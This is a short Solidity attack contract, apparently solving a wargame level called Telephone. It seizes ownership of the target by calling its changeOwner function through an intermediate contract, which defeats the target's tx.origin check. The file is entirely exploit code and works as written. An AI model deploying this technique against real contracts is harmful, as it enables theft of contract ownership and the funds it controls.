pragma solidity ^0.8.0;

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttacker {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function runExploit(address telephoneAddress) external {
    ITelephone(telephoneAddress).changeOwner(owner);
  }

}